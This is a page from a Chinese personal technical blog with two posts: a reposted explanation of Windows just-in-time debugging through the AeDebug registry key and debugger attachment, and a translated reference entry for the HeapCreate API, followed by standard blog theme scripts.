<td>Visual Studio</td>
<td>断点</td>
<td>设置一个断点</td>
</tr>
</tbody>
</table>
<h3 id="摘抄"><a href="#摘抄" class="headerlink" title="摘抄"></a>摘抄</h3><p>随时将调试程序连接到任何进程的能力称为即时调试（Just-in-timeDebugging）。</p>
<p>这里我们对它如何工作稍加说明：当程序员点击Cancel按钮，就是告诉UnhandledExceptionFilter函数对进程进行调试。在内部，UnhandledExceptionFilter调用调试程序，这需要查看下面的注册表子关键字：</p>
<p><font color="#0f0">HKEY_LOCAL_MACHINE/SOFTWARE/Microsoft/Windows NT/CurrentVersion/AeDebug<br>在这个子关键字里，有一个名为Debugger的数值，在安装VisualStudio时被设置成下面的值：<br>&quot;C:/Program Files/Microsoft Visual Studio/Common/MSDev98/Bin/msdev.exe&quot; -p %ld -e %ld<br></font><br>在Windows98中，这些值不是存放在注册表中，而是存放在Win.ini文件中。<br>这一行代码是告诉系统要将哪一个程序（这里是MSDev.exe）作为调试程序运行。当然也可以选择其他调试程序。 UnhandledExceptionFilter还在这个命令行中向调试程序传递两个参数。第一个参数是被调试进程的ID。第二个参数规定一个可继承的 手工复位事件，这个事件是由UnhandledExceptionFilter按无信号状态建立的。厂商必须实现他们的调试程序，这样才能认识指定进程 ID和事件句柄的-p和-e选项。<br>在进程ID和事件句柄都合并到这个串中之后，UnhandledExceptionFilter通过调用 CreateProcess来执行调试程序。这时，调试程序进程开始运行并检查它的命令行参数。如果存在-p选项，调试程序取得进程ID，并通过调用 DebugActiveProcess将自身挂接在该进程上。<br>BOOL DebugActiveProcess(DWORD dwProcessID);<br>一旦调试程序完成自身的挂接，操作系统将被调试者（debuggee）的状态通报给调试程序。<br>在调试程序完全初始化之后，它要再检查它的命令行，找-e选项。如果该选项存在，调试程序取得相应的事件句柄并调用SetEvent。调试程序可以直接使用事件的句柄值，因为事件句柄具有创建的可继承性，并且被调试进程对UnhandledExceptionFilter函数的调用也使调试程序进程成为一个子进程。</p>
<p>设定这个事件将唤醒被调试进程的线程。被唤醒的线程将有关未处理异常的信息传递给调试程序。调试程序接收这些通知并加载相应的源代码文件，再将自身放在引发异常的指令位置上。<br>还有，不必在调试进程之前等待异常的出现。可以随时将一个调试程序连接在任何进程上，只需运行“MSDEV-pPID”，其中PID是要调试的进程的ID。 实际上，利用Windows2000 TaskManager，做这些事很容易。当观察Process标记栏时，可以选择一个进程，点击鼠标右键，并选择Debug菜单选项。这将引起 TaskManager去查看前面讨论过的注册表子关键字，调用CreateProcess，并传递所选定的进程的ID作为参数。在这里，TaskManager为事件句柄传送0值。</p>
<h3 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h3><p>本文转自<a href="http://blog.csdn.net/dongzhiquan/article/details/4568389" target="_blank" rel="external">即时调试（Just-in-timeDebugging） Visual Studio调试 断点中断程序的执行(断点指令)</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2017/06/23/HeapCreate/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Introspelliam">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/me.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="上善若水">
    </span>

    
      <header class="post-header">

        
        
          <h2 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/23/HeapCreate/" itemprop="url">HeapCreate()</a></h2>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-23T13:23:37+08:00">
                2017-06-23
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/安全技术/" itemprop="url" rel="index">
                    <span itemprop="name">安全技术</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <p>HeapCreate<br>这个函数创建一个只有调用进程才能访问的私有堆。进程从虚拟地址空间里保留出一个连续的块并且为这个块特定的初始部分分配物理空间。</p>
<p>HANDLE HeapCreate(DWORD flOptions , DWORD dwInitialSize , DWORD dwMaxmumSize);</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>flOptions：堆的可选属性。这些标记影响以后对这个堆的函数操作，函数有：HeapAlloc , HeapFree , HeapReAlloc , HeapSize .<br>下面给_出在此可以指定的标记：<br>HEAP_NO_SERIALIAZE：指定当函数从堆里分配和释放空间时不互斥（不使用互斥锁）。当不指定该标记时默认为使用互斥。序列化允许多个线程操作同一个堆而不会错误。这个标记是可忽略的。<br>HEAP_SHARED_READONLY：这个标记指定这个堆只能由创建它的进程进行写操作，对其他进程是只读的。如果调用者不是可靠的，调用将会失败，错误代码ERROR_ACCESS_DENIDE 。<br>注解：为了使用标记为HEAP_SHARED_READONLY的堆，运行在kernel mode（核心状态）是必须的。</p>
<p>dwInitialSize：堆的初始大小，单位为Bytes。这个值决定了分配给堆的初始物理空间大小。这个值将向上舍入知道下个page boundary（页界）。若需得到主机的页大小，使用GetSystemInfo 函数。</p>
<p>dwMaxmumSize：如果该参数是一个非零的值，它指定了这个堆的最大大小，单位为Bytes。该函数会向上舍入该值直到下个页界，然后为这个堆在进程的虚拟地址里保留舍入后大小的块。如果函数 HeapAlloc 和 HeapReAlloc 要求分配的空间超过参数 dwInitialSize 指定的大小，系统会分配额外的空间给该堆直到这个堆的最大大小。If dwMaximumSize is nonzero, the heap cannot grow and an absolute limitation arises where all allocations are fulfilled within the specified heap unless there is not enough free space. （如果该参数非零，除非没有足够的空间，这个堆总可以增长到该大小）。如果该参数为零，那么该堆大小的唯一限制是可用的内存空间。分配大小超过 0x0018000 Bytes的空间总会失败，因为获得这么大的空间需要系统调用 VirtualAlloc 函数。需要使用大空间的应用应该把该参数设置为零。</p>
<h4 id="返回值"><a href="#返回值" class="headerlink" title="返回值"></a>返回值</h4><p>成功：一个指向新创建的堆的指针。<br>失败：NULL<br>调用函数 GetLastError 获得更多的错误信息。</p>
<h4>附注</h4>

<p>这个函数在调用进程里创建一个私有堆，进程可调用 HeapAlloc 函数分配内存空间。这些页在进程的虚拟空间内创建了一个块，在那里堆可以增长。<br>如果 HeapAlloc 函数请求的空间超过了现有的页大小，如果物理空间足够的话，额外的空间将会从已保留的空间里附加。<br>只有创建私有堆的进程可以访问私有堆。<br>如果一个DLL（动态链接库）创建了一个私有堆，那么这么私有堆是在调用该DLL的进程的地址空间内，且仅该进程可访问。<br>系统会使用私有堆的一部分空间去储存堆的结构信息，所以，不是所有的堆内空间对进程来说是可用的。例如：HeapAlloc函数从一个最大大小为 64KB 的堆里申请 64KB 的空间，由于系统占用的一部分空间，这个请求通常会失败。</p>
<h4 id="要求"><a href="#要求" class="headerlink" title="要求"></a>要求</h4><table>
<thead>
<tr>
<th></th>
<th></th>
</tr>
</thead>
<tbody>
<tr>
<td>Minimum supported client</td>
<td>Windows XP [desktop apps or Windows Store apps]</td>
</tr>
<tr>
<td>Minimum supported server</td>
<td>Windows Server 2003 [desktop apps or Windows Store apps]</td>
</tr>
<tr>
<td>Minimum supported phone</td>
<td>Windows Phone 8</td>
</tr>
<tr>
<td>Header</td>
<td>HeapApi.h (include Windows.h);<br>WinBase.h on Windows Server 2008 R2, Windows 7, Windows Server 2008, Windows Vista, Windows Server 2003 and Windows XP (include Windows.h)</td>
</tr>
<tr>
<td>Library</td>
<td>Kernel32.lib</td>
</tr>
<tr>
<td>DLL</td>
<td>Kernel32.dll</td>
</tr>
</tbody>
</table>
<h4 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h4><p><a href="https://msdn.microsoft.com/en-us/library/windows/desktop/aa366597.aspx" target="_blank" rel="external">HeapCreate in MSDN</a><br><a href="http://blog.csdn.net/windroid/article/details/42302519" target="_blank" rel="external">HeapCreate()</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/11/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><span class="page-number current">12</span><a class="page-number" href="/page/13/">13</a><a class="page-number" href="/page/14/">14</a><a class="extend next" rel="next" href="/page/13/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
      <div id="sidebar-dimmer"></div>
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview sidebar-panel sidebar-panel-active">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image"
               src="/images/me.jpg"
               alt="Introspelliam" />
          <p class="site-author-name" itemprop="name">Introspelliam</p>
           
              <p class="site-description motion-element" itemprop="description"></p>
           
        </div>
        <nav class="site-state motion-element">

          
            <div class="site-state-item site-state-posts">
            
              <a href="/archives/">
            
                <span class="site-state-item-count">133</span>
                <span class="site-state-item-name">日志</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-categories">
              <a href="/categories/index.html">
                <span class="site-state-item-count">16</span>
                <span class="site-state-item-name">分类</span>
              </a>
            </div>
          

          
            
            
            <div class="site-state-item site-state-tags">
              <a href="/tags/index.html">
                <span class="site-state-item-count">55</span>
                <span class="site-state-item-name">标签</span>
              </a>
            </div>
          

        </nav>

        
          <div class="feed-link motion-element">
            <a href="/atom.xml" rel="alternate">
              <i class="fa fa-rss"></i>
              RSS
            </a>
          </div>
        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/Introspelliam" target="_blank" title="GitHub">
                  
                    <i class="fa fa-fw fa-github"></i>
                  
                    
                      GitHub
                    
                </a>
              </span>
            
              <span class="links-of-author-item">
                <a href="http://weibo.com/u/3008590672" target="_blank" title="Weibo">
                  
                    <i class="fa fa-fw fa-weibo"></i>
                  
                    
                      Weibo
                    
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      

      
        <div class="back-to-top">
          <i class="fa fa-arrow-up"></i>
          
        </div>
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright" >
  
  &copy; 
  <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Introspelliam</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动</div>

  <span class="post-meta-divider">|</span>

  <div class="theme-info">主题 &mdash; <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.2</div>


        
<div class="busuanzi-count">
  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>

  
    <span class="site-uv">
      <i class="fa fa-user"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
      
    </span>
  

  
    <span class="site-pv">
      <i class="fa fa-eye"></i>
      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
      
    </span>
  
</div>








        
      </div>
    </footer>

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>



  
  

  
    <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>



  


  




	





  





  










  

  <script type="text/javascript">
    // Popup Window;
    var isfetched = false;
    var isXml = true;
    // Search DB path;
    var search_path = "search.xml";
    if (search_path.length === 0) {
      search_path = "search.xml";
    } else if (/json$/i.test(search_path)) {
      isXml = false;
    }
    var path = "/" + search_path;
    // monitor main search box;

    var onPopupClose = function (e) {
      $('.popup').hide();
      $('#local-search-input').val('');
      $('.search-result-list').remove();
      $('#no-result').remove();
      $(".local-search-pop-overlay").remove();
      $('body').css('overflow', '');
    }

    function proceedsearch() {
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
        .css('overflow', 'hidden');
      $('.search-popup-overlay').click(onPopupClose);
      $('.popup').toggle();
      var $localSearchInput = $('#local-search-input');
      $localSearchInput.attr("autocapitalize", "none");
      $localSearchInput.attr("autocorrect", "off");
      $localSearchInput.focus();
    }

    // search function;
    var searchFunc = function(path, search_id, content_id) {
      'use strict';

      // start loading animation
      $("body")
        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
          '<div id="search-loading-icon">' +
          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
          '</div>' +
          '</div>')
        .css('overflow', 'hidden');
      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');

      $.ajax({
        url: path,
        dataType: isXml ? "xml" : "json",
        async: true,
        success: function(res) {
          // get the contents from search data
          isfetched = true;
          $('.popup').detach().appendTo('.header-inner');
          var datas = isXml ? $("entry", res).map(function() {
            return {
              title: $("title", this).text(),
              content: $("content",this).text(),
              url: $("url" , this).text()
            };
          }).get() : res;
          var input = document.getElementById(search_id);
          var resultContent = document.getElementById(content_id);
          var inputEventFunction = function() {
            var searchText = input.value.trim().toLowerCase();
            var keywords = searchText.split(/[\s\-]+/);
            if (keywords.length > 1) {
              keywords.push(searchText);
            }
            var resultItems = [];
            if (searchText.length > 0) {
              // perform local searching
              datas.forEach(function(data) {
                var isMatch = false;
                var hitCount = 0;
                var searchTextCount = 0;
                var title = data.title.trim();
                var titleInLowerCase = title.toLowerCase();
                var content = data.content.trim().replace(/<[^>]+>/g,"");
                var contentInLowerCase = content.toLowerCase();
                var articleUrl = decodeURIComponent(data.url);
                var indexOfTitle = [];
                var indexOfContent = [];
                // only match articles with not empty titles
                if(title != '') {
                  keywords.forEach(function(keyword) {
                    function getIndexByWord(word, text, caseSensitive) {
                      var wordLen = word.length;
                      if (wordLen === 0) {
                        return [];
                      }
                      var startPosition = 0, position = [], index = [];
                      if (!caseSensitive) {
                        text = text.toLowerCase();
                        word = word.toLowerCase();
                      }
                      while ((position = text.indexOf(word, startPosition)) > -1) {
                        index.push({position: position, word: word});
                        startPosition = position + wordLen;
                      }
                      return index;
                    }

                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
                  });
                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
                    isMatch = true;
                    hitCount = indexOfTitle.length + indexOfContent.length;
                  }
                }

                // show search results

                if (isMatch) {
                  // sort index by position of keyword

                  [indexOfTitle, indexOfContent].forEach(function (index) {
                    index.sort(function (itemLeft, itemRight) {
                      if (itemRight.position !== itemLeft.position) {
                        return itemRight.position - itemLeft.position;
                      } else {
                        return itemLeft.word.length - itemRight.word.length;
                      }
                    });
                  });

                  // merge hits into slices

                  function mergeIntoSlice(text, start, end, index) {
                    var item = index[index.length - 1];
                    var position = item.position;
                    var word = item.word;
                    var hits = [];
                    var searchTextCountInSlice = 0;
                    while (position + word.length <= end && index.length != 0) {
                      if (word === searchText) {
                        searchTextCountInSlice++;
                      }
                      hits.push({position: position, length: word.length});
                      var wordEnd = position + word.length;

                      // move to next position of hit

                      index.pop();
                      while (index.length != 0) {
                        item = index[index.length - 1];
                        position = item.position;
                        word = item.word;
                        if (wordEnd > position) {
                          index.pop();
                        } else {
                          break;
                        }
                      }
                    }
                    searchTextCount += searchTextCountInSlice;
                    return {
                      hits: hits,
                      start: start,
                      end: end,
                      searchTextCount: searchTextCountInSlice
                    };
                  }

                  var slicesOfTitle = [];
                  if (indexOfTitle.length != 0) {
                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
                  }

                  var slicesOfContent = [];
                  while (indexOfContent.length != 0) {
                    var item = indexOfContent[indexOfContent.length - 1];
                    var position = item.position;
                    var word = item.word;
                    // cut out 100 characters
                    var start = position - 20;
                    var end = position + 80;
                    if(start < 0){
                      start = 0;
                    }
                    if (end < position + word.length) {
                      end = position + word.length;
                    }
                    if(end > content.length){
                      end = content.length;
                    }
                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
                  }

                  // sort slices in content by search text's count and hits' count

                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
                      return sliceRight.hits.length - sliceLeft.hits.length;
                    } else {
                      return sliceLeft.start - sliceRight.start;
                    }
                  });

                  // select top N slices in content

                  var upperBound = parseInt('1');
                  if (upperBound >= 0) {
                    slicesOfContent = slicesOfContent.slice(0, upperBound);
                  }

                  // highlight title and content

                  function highlightKeyword(text, slice) {
                    var result = '';
                    var prevEnd = slice.start;
                    slice.hits.forEach(function (hit) {
                      result += text.substring(prevEnd, hit.position);
                      var end = hit.position + hit.length;
                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
                      prevEnd = end;
                    });
                    result += text.substring(prevEnd, slice.end);
                    return result;
                  }

                  var resultItem = '';

                  if (slicesOfTitle.length != 0) {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
                  } else {
                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
                  }

                  slicesOfContent.forEach(function (slice) {
                    resultItem += "<a href='" + articleUrl + "'>" +
                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
                      "...</p>" + "</a>";
                  });

                  resultItem += "</li>";
                  resultItems.push({
                    item: resultItem,
                    searchTextCount: searchTextCount,
                    hitCount: hitCount,
                    id: resultItems.length
                  });
                }
              })
            };
            if (keywords.length === 1 && keywords[0] === "") {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
            } else if (resultItems.length === 0) {
              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
            } else {
              resultItems.sort(function (resultLeft, resultRight) {
                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
                  return resultRight.searchTextCount - resultLeft.searchTextCount;
                } else if (resultLeft.hitCount !== resultRight.hitCount) {
                  return resultRight.hitCount - resultLeft.hitCount;
                } else {
                  return resultRight.id - resultLeft.id;
                }
              });
              var searchResultList = '<ul class=\"search-result-list\">';
              resultItems.forEach(function (result) {
                searchResultList += result.item;
              })
              searchResultList += "</ul>";
              resultContent.innerHTML = searchResultList;
            }
          }

          if ('auto' === 'auto') {
            input.addEventListener('input', inputEventFunction);
          } else {
            $('.search-icon').click(inputEventFunction);
            input.addEventListener('keypress', function (event) {
              if (event.keyCode === 13) {
                inputEventFunction();
              }
            });
          }

          // remove loading animation
          $(".local-search-pop-overlay").remove();
          $('body').css('overflow', '');

          proceedsearch();
        }
      });
    }

    // handle and trigger popup window;
    $('.popup-trigger').click(function(e) {
      e.stopPropagation();
      if (isfetched === false) {
        searchFunc(path, 'local-search-input', 'local-search-result');
      } else {
        proceedsearch();
      };
    });

    $('.popup-btn-close').click(onPopupClose);
    $('.popup').click(function(e){
      e.stopPropagation();
    });
    $(document).on('keyup', function (event) {
      var shouldDismissSearchPopup = event.which === 27 &&
        $('.search-popup').is(':visible');
      if (shouldDismissSearchPopup) {
        onPopupClose();
      }
    });
  </script>





  

  
<script>
(function(){
    var bp = document.createElement('script');
    var curProtocol = window.location.protocol.split(':')[0];
    if (curProtocol === 'https') {
        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
    }
    else {
        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
    }
    var s = document.getElementsByTagName("script")[0];
    s.parentNode.insertBefore(bp, s);
})();
</script>


  

  
  
    <script type="text/x-mathjax-config">
      MathJax.Hub.Config({
        tex2jax: {
          inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
          processEscapes: true,
          skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
        }
      });
    </script>

    <script type="text/x-mathjax-config">
      MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for (i=0; i < all.length; i += 1) {
          all[i].SourceElement().parentNode.className += ' has-jax';
        }
      });
    </script>
    <script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script><!-- hexo-inject:begin --><!-- Begin: Injected MathJax -->
<script type="text/x-mathjax-config">
  MathJax.Hub.Config("");
</script>

<script type="text/x-mathjax-config">
  MathJax.Hub.Queue(function() {
    var all = MathJax.Hub.getAllJax(), i;
    for(i=0; i < all.length; i += 1) {
      all[i].SourceElement().parentNode.className += ' has-jax';
    }
  });
</script>

<script type="text/javascript" src="custom_mathjax_source">
</script>
<!-- End: Injected MathJax -->
<!-- hexo-inject:end -->
  


  

  

</body>
</html>
